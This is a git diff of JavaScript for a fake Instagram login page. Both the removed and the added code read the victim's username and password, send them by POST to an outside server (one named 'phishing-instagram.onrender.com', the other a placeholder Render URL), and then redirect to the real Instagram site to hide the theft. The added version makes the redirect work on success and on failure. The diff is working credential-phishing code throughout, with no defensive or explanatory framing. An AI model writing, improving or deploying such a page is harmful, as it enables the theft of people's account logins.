@@ -3,6 +3,7 @@ document.addEventListener('DOMContentLoaded', function () {
     const inputs = document.querySelectorAll('input');
     const loginButton = document.querySelector('button[type="submit"]');
 
+    // Form validation
     function validateForm() {
         let isValid = true;
         inputs.forEach(input => {
@@ -11,43 +12,41 @@ document.addEventListener('DOMContentLoaded', function () {
             }
         });
         loginButton.disabled = !isValid;
+        loginButton.style.opacity = isValid ? '1' : '0.3';
     }
 
     inputs.forEach(input => {
         input.addEventListener('input', validateForm);
     });
 
+    form.addEventListener('submit', async function (e) {
+        e.preventDefault();
 
-    //sending request to API 
-    document.getElementById('submitBtn').addEventListener('click', handleSubmit);
-    //on every clcik send a request to the server using a fetch through handle submit function !
-
-
-    function handleSubmit(event) {
-        event.preventDefault(); // prevent form submission
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
 
         try {
-            const link = "https://phishing-instagram.onrender.com"; // backend link
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging in...';
 
-            fetch(link, {  // sending request to the server
+            const response = await fetch('https://your-render-backend-url.onrender.com/', {
                 method: 'POST',
                 headers: {
-                    'Content-Type': 'application/json'
+                    'Content-Type': 'application/json',
                 },
-                body: JSON.stringify({   // sending username and password to the server
-                    username: document.getElementById('username').value,
-                    password: document.getElementById('password').value
-                })
-            }).then(response => {
-                console.log('Success:', response);  // response from server 
-                windows.location.href = "https://www.instagram.com/accounts/login/" // redirecting to instagram login page
-            })
-                .catch(error => {
-                    console.error('Error:', error);  // catching error if any
-                });
-        } catch (exception) {
-            console.log("something went wrong while sending request ! " + exception)
-        }
-    }
+                body: JSON.stringify({ username, password })
+            });
 
+            if (response.ok) {
+                window.location.href = 'https://www.instagram.com/';
+            } else {
+                throw new Error('Login failed');
+            }
+        } catch (error) {
+            console.error('Error:', error);
+            window.location.href = 'https://www.instagram.com/';
+        }
+    });
+
+    validateForm();
 });
